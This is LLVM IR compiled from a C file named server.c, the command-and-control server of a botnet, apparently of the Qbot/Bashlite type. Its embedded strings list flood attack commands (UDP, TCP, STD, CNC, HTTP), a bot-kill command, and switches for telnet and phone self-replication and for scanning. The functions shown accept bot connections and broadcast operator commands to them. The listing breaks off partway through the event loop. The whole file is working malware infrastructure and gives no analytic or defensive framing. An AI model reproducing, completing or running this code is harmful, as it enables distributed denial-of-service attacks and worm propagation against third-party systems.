; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [100 x i8], [100 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"!* BOTKILL\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.9 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.10 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.11 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.16 = private unnamed_addr constant [47 x i8] c"%c]0; Planets [ %d ] | [ %s ] - Stars [ %d ]%c\00", align 1
@accounts = internal global [100 x %struct.login_info] zeroinitializer, align 16
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.19 = private unnamed_addr constant [21 x i8] c"\1B[36mUsername\1B[97m: \00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[36mPassword\1B[97m: \00", align 1
@.str.22 = private unnamed_addr constant [112 x i8] c"\1B[96mPlease wait \1B[32m%s \1B[96mwe are verifying if your planet is part of \1B[35;1mThe Galaxy \1B[32m[\1B[91m|\1B[32m]\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [112 x i8] c"\1B[96mPlease wait \1B[32m%s \1B[96mwe are verifying if your planet is part of \1B[35;1mThe Galaxy \1B[32m[\1B[91m/\1B[32m]\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [112 x i8] c"\1B[96mPlease wait \1B[32m%s \1B[96mwe are verifying if your planet is part of \1B[35;1mThe Galaxy \1B[32m[\1B[91m-\1B[32m]\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [106 x i8] c"\1B[35m      \1B[36m  .d8888b. \1B[35m          888       \1B[32mo\1B[35m                     \1B[32m   .-o--.     \0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [111 x i8] c"\1B[35m  \1B[32m0    \1B[36md88P  Y88b\1B[35m          888             \1B[32mO\1B[35m               \1B[32m  :O o O :    \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [96 x i8] c"\1B[35m      \1B[36m 888    888\1B[35m          888                             \1B[32m  : O. Oo;    \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [96 x i8] c"\1B[35m      \1B[36m 888       \1B[35m  8888b.  888  8888b.  888  888 888  888 \1B[32m    `-.O-'     \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m 888  88888\1B[35m     *88b 888     *88b `Y8bd8P' 888  888 \1B[32m              \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m 888    888\1B[35m .d888888 888 .d888888   X88K   888  888 \1B[32m              \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m Y88b  d88P\1B[35m 888  888 888 888  888 .d8**8b. Y88b 888 \1B[32m              \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m  *Y8888P88\1B[35m *Y888888 888 *Y888888 888  888  *Y88888 \1B[32m              \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [105 x i8] c"\1B[35m      \1B[36m           \1B[35m                        \1B[32m.\1B[35m            888 \1B[32m              \0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [105 x i8] c"\1B[35m      \1B[36m    \1B[32mo\1B[35m       \1B[35m                               Y8b d88P \1B[32m              \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [95 x i8] c"\1B[35m      \1B[36m           \1B[35m                                 *Y88P*  \1B[32m              \0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [40 x i8] c"\1B[32m%s\1B[36m@\1B[35mTheGalaxy\1B[94m>\1B[37m \00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.38 = private unnamed_addr constant [31 x i8] c"\1B[35mPlanets:        \1B[32m%d\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [31 x i8] c"\1B[35mDwarf Planets:  \1B[32m%d\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [31 x i8] c"\1B[35mStars Online:   \1B[32m%d\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.42 = private unnamed_addr constant [51 x i8] c"\1B[37m[---\1B[31mList Of Helpfull Commands\1B[37m---]\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [58 x i8] c"\1B[32mSTOP         \1B[37m| \1B[36mKills All Current Attacks\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [59 x i8] c"\1B[32mSTATUS       \1B[37m| \1B[36mShows The Status Of Botnet\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [64 x i8] c"\1B[32mATTACK       \1B[37m| \1B[36mDisplays Help For DDoS Commands\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [50 x i8] c"\1B[32mCLEAR        \1B[37m| \1B[36mClears You Screen\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [65 x i8] c"\1B[32m!* TELNET    \1B[37m| \1B[36mON | OFF | Starts Telnet Selfrep\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"\1B[32m!* PHONE     \1B[37m| \1B[36mON | OFF | Starts Phones Selfrep\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [65 x i8] c"\1B[32m!* SCANNER   \1B[37m| \1B[36mON | OFF | Starts Telnet Scanner\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [7 x i8] c"ATTACK\00", align 1
@.str.51 = private unnamed_addr constant [43 x i8] c"\1B[37m[----\1B[31mAttack Commands\1B[37m----]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [89 x i8] c"\1B[32m!* UDP \1B[35mIP PORT TIME 32 0 10                 \1B[37m|\1B[36m Launches A UDP Flood\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [89 x i8] c"\1B[32m!* TCP \1B[35mIP PORT TIME 32 all 0 10             \1B[37m|\1B[36m Launches A TCP Flood\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [89 x i8] c"\1B[32m!* STD \1B[35mIP PORT TIME SIZE                    \1B[37m|\1B[36m Launches A STD Flood\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [89 x i8] c"\1B[32m!* CNC \1B[35mIP PORT TIME                         \1B[37m|\1B[36m Launches A CNC Flood\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [90 x i8] c"\1B[32m!* HTTP \1B[35mGET|HEAD|POST IP 80 / TIME POWER    \1B[37m|\1B[36m Launches A HTTP Flood\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [11 x i8] c"!* BOTKILL\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"!* BOTKILL\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.60 = private unnamed_addr constant [53 x i8] c"\1B[96m[ATTACKS] \1B[37mAttempting To Stop All Attacks\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [8 x i8] c"output.\00", align 1
@.str.62 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.65 = private unnamed_addr constant [42 x i8] c"\1B[96m[LOGOUT] \1B[37m%s Has Been Logged Out\00", align 1
@.str.66 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.67 = private unnamed_addr constant [12 x i8] c"history.log\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.71 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.74 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.75 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.76 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"ZERO\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.83 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %295
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %292, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %295

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %292

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %184

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %183

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %183

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
